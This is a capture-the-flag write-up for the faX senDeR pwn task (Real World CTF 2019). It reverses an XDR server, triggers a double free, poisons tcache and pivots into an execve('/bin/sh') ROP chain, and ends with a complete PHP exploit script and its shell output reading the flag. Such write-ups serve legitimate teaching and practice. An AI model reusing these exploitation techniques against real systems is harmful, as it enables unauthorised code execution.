# faX senDeR - Real World CTF 2019 Quals

## Introduction

faX senDeR is a pwn task. 

An archive containing the files required to run and debug the task is provided.
`server` is the target running on the remote server, while `client` is used to
show the features of the server.


## First run

The server binary waits for input on the standard entry. Anything makes it
answer `Wrong choice` and exit.

The client binary asks for a server's IP address. It then connects to this IP on
the TCP port `10917`.

The way to interact with the server is to create a server on port `10917` that
interacts with the server's standard input/output.

```sh
socat tcp4-listen:10917,reuseaddr,fork exec:./server
```


## Reverse engineering

The server binary is statically linked and stripped. It doesn't require much
efforts to find the main loop.

The task's name contains three capital letters: X, D and R. According to
[https://en.wikipedia.org/wiki/External_Data_Representation](Wikipedia), `XDR`
is a data representation protocol. The
[https://tools.ietf.org/html/rfc1014](RFC1014) describe a wire protocol that
matches the packets sent by the client application.

Ghidra already contains the definition of glibc's xdr function and structures.
The `XDR(3)` man page also contains a list of every xdr-related functions.
This makes the reverse engineering part very easy.


### Packets

The following packets have been identified through reverse engineering and
analysis of the network traffic:

#### `contact_add`
```
int 1
int count
	string name[i]
	string ip[i]
```

#### `contact_list`
```
int 2
```

#### `contact_del`
```
int 3
int idx
```

#### `msg_add`
```
int 4
int dstIdx
string message
```

#### `msg_list`
```
int 5
```

#### `msg_del`
```
int 6
int msgIdx
```

#### `msg_send`
```
int 7
int msgIdx
```


### Structures

The following structures have been identified:

#### contact
```c
struct contact {
	char *name;
	char *ip;
};
```

#### message
```c
struct message {
	unsigned long contactIdx;
	char  *buffer;
	size_t length;
};
```


## Vulnerability

There is a global array of contact **pointers**, and a global array of messages.
```c
struct contact* g_contact_list[0x0F];
struct message  g_message_list[0x10];
```

When a message is deleted, its buffer is freed, and its size is set to 0.
The code knows that a spot in the array is free because the size is set to 0.
```c
free(g_message_list[i].buffer);
g_message_list[i].size = 0;
```

Adding a message with a corrupted packet (size of 0x4000) will result in the
code skipping the initialisation of the buffer, effectively using uninitialized
memory.

This behaviour can be abused with the following code:
```c
msg_add(0, 0x20, "a");  /* {.contactIdx = 0, .buffer = "a", .size = 0x0020} */
msg_del(0);             /* {.contactIdx = 0, .buffer = "a", .size = 0x0000} */
msg_add(0, 0x4000, ""); /* {.contactIdx = 0, .buffer = "a", .size = 0x4000} */
```

The message can then be freed a second time, resulting in a double free.


## Exploitation

### Arbitrary write

`server` being a statically-compiled binary, the `malloc` implementation is
stored within the binary. This version of `malloc` implements the `tcache`
optimisation with no protection.

Exploitation becomes trivial:
1. trigger the double free
2. make `malloc()` return the freed chunk
3. poison tcache by overwriting its `fd` pointer (first bytes)
4. overwrite a function pointer

A good candidate for the function pointers is the vtable used by XDR, located at
`0x006b9140`. This address is always the same because the binary is compiled
statically and therefore shares its .bss with the libc's .bss section.

Ovewriting the pointer results in the following state:
```
Program received signal SIGSEGV, Segmentation fault.
0x000000000044df61 in ?? ()
=> 0x000000000044df61:	ff 50 08	call   QWORD PTR [rax+0x8]
(gdb) x/8gz $rax
0x6b9140:	0x2020202020202020	0x2020202020202020
0x6b9150:	0x2020202020202020	0x2020202020202020
0x6b9160:	0x2020202020202020	0x2020202020202020
0x6b9170:	0x2020202020202020	0x2020202020202020
```


### ROP chain

The next logical step is to pivot the stack and use the new buffer as a ROP
chain.

The `xchg eax, esp` gadget works because the higher 32-bits of `eax` are set to
0. This gadget will set `esp` to the beginning of the buffer.

Pivot 
```
       +---------------+
+----> | pop any       | -----+
|      +---------------+      |
|                             |
|      +---------------+      |
|      | entry:        |      |
+----- | xchg esp, eax |      |
       +---------------+      |
                              |
+-----------------------------+
|
|     +-------------------+
+---> | rest of the chain |
      |       ...         |
```

The rest of the chain calls the classic `execve("/bin/sh", NULL, NULL)`:
```
+---------+ +------------+
| pop rdi | | "/bin/sh"  |
+---------+ +------------+

+---------+ +------------+
| pop rsi | | NULL       |
+---------+ +------------+

+---------+ +------------+
| pop rax | | SYS_execve |
| pop rdx | | NULL       |
| pop rbx | | any        |
+---------+ +------------+

+---------+
| syscall |
+---------+
```

The flag is located in `/flag`.

**Flag**: `rwctf{Digging_Into_libxdr}`

## Appendices

### gadgets.txt
The following gadgets have been used in the final exploit:
```
0x00493c4f: pop rdi ; ret  ;  (1 found)
0x0046aa53: pop rsi ; ret  ;  (1 found)
0x004841d6: pop rax ; pop rdx ; pop rbx ; ret  ;  (1 found)
0x00468a62: xchg eax, esp ; ret  ;  (1 found)
0x004878d5: syscall  ; ret  ;  (1 found)
0x0048fc98: int3  ; ret  ;  (1 found)
```

### pwn.php
The following script has been used execute arbitrary commands on the remote
server:
```php
#!/usr/bin/php
<?php // vim: filetype=php
require_once "/home/user/ctf/tools/pwn/phplib/hexdump.php";
require_once "/home/user/ctf/tools/pwn/phplib/tubes/Process.php";
require_once "/home/user/ctf/tools/pwn/phplib/tubes/Socket.php";

const COMMAND = "./server";
const HOST    = "tcp.realworldctf.com";
const PORT    = 10917;

function xdr_expect(Tube $t, $str)
{
	$t->expect(pack("N", strlen($str)));
	$t->expect($str);
	$t->expect(str_repeat("\x00", 4096 - (strlen($str) + 4)));
}

function xdr_string($buffer)
{
	$length = unpack("N", substr($buffer, 0, 4))[1];
	return substr($buffer, 4, $length);
}

function str(Tube $t)
{
	return xdr_string($t->read(4096));
}

function strs(Tube $t, $count)
{
	$ret = [];

	for($i = 0; $i < $count; $i++)
		$ret[] = str($t);

	return $ret;
}

function contact_add(Tube $t, $contacts)
{
	$buffer  = pack("N", 1);
	$buffer .= pack("N", sizeof($contacts));

	foreach($contacts as list($name, $ip)) {
		$buffer .= pack("N", strlen($name));
		$buffer .= str_pad($name, 4 * ceil(strlen($name) / 4), "\x00");

		$buffer .= pack("N", strlen($ip));
		$buffer .= str_pad($ip, 4 * ceil(strlen($ip) / 4), "\x00");
	}

	$buffer = str_pad($buffer, 4096, "\x00");
	$t->write($buffer);

	xdr_expect($t, "Add contacts success!\n");
}

function contact_list(Tube $t, $count = null)
{
	$buffer = pack("N", 2);
	$t->write($buffer);

	if($count !== null)
		return strs($t, $count);
}

function contact_del(Tube $t, $idx)
{
	$buffer = pack("NN", 3, $idx);
	$t->write($buffer);
	xdr_expect($t, "Delete contacts success!\n");
}

function msg_add(Tube $t, $idx, $msg, $fast = false)
{
	$buffer = pack("NNN", 4, $idx, strlen($msg)) . $msg;
	$t->write($buffer);

	if(!$fast)
		xdr_expect($t, "Add message success!\n");
}

function msg_list(Tube $t, $count = null)
{
	$buffer = pack("N", 5);
	$t->write($buffer);

	if($count !== null)
		return strs($t, $count);
}

function msg_del(Tube $t, $idx)
{
	$buffer = pack("NN", 6, $idx);
	$t->write($buffer);
	xdr_expect($t, "Delete message success!\n");
}


function msg_post(Tube $t, $idx)
{
	$buffer = pack("NN", 7, $idx);
	$t->write($buffer);
	xdr_expect($t, "send message success!\n");
}

printf("[*] Creating process\n");
$time = microtime(true);
//$t = new Process(COMMAND);
$t = new Socket(HOST, PORT);

printf("[+] Done in %f seconds\n", microtime(true) - $time);
printf("\n");

$contact = [
	["XeR", "127.0.0.1"],
];

contact_add($t, $contact);

$size = 0x80;
printf("[*] Double free (size = %X)\n", $size);
msg_add($t, 0, str_repeat("A", $size));
msg_del($t, 0);

/* glitched message */
$buffer = pack("NNN", 4, 0, 0x4000);
$t->write($buffer);
xdr_expect($t, "Add message success!\n");

msg_del($t, 0);


printf("[*] Poison tcache\n");
$payload = pack("Q", 0x006b9140);
$payload = str_pad($payload, $size);
msg_add($t, 0, $payload);
msg_add($t, 0, str_repeat("C", $size));

$payload = pack("Q*",
	0x00493c4f, // pop rdi (to skip the xchg)
	0x00468a62, // xchg eax, esp (ok because 32 bits)

	0x00493c4f, 0x006b9140 + 8 * 12, // pop rdi /bin/sh
	0x0046aa53, 0, // pop rsi
	0x004841d6, 59, 0, 0, // pop rax, rdx, rbx

	0x004878d5, // syscall
	0x0048fc98, // int3
);
$payload .= "/bin/sh\0";
$payload = str_pad($payload, $size);

printf("[*] Execute ROP chain\n");
msg_add($t, 0, $payload, true);

printf("[*] Sending commands...\n");
$t->write("id; ls -la /; cat /flag\n");


dump:
printf("[!] Dumping...\n");
while($buffer = $t->read(4096)) {
	//printf("%s", hexdump($buffer));
	printf("%s", $buffer);
}
```

Example run:
```
[*] Creating process
[+] Done in 0.161806 seconds

[*] Double free (size = 80)
[*] Poison tcache
[*] Execute ROP chain
[*] Sending commands...
[!] Dumping...
sh: 1: id: not found
total 800
drwxr-xr-x 6 0    0   4096 Sep 14 13:30 .
drwxr-xr-x 6 0    0   4096 Sep 14 13:30 ..
drwxr-xr-x 2 0    0   4096 Sep 13 15:34 bin
drwxr-xr-x 2 0    0   4096 Sep 13 15:33 dev
-rw-r----- 1 0 1000     27 Sep 13 15:30 flag
drwxr-xr-x 2 0    0   4096 Sep 13 15:34 lib
drwxr-xr-x 2 0    0   4096 Sep 13 15:34 lib64
-rwxr-xr-x 1 0    0 786872 Sep 14 13:25 server
rwctf{Digging_Into_libxdr}
```
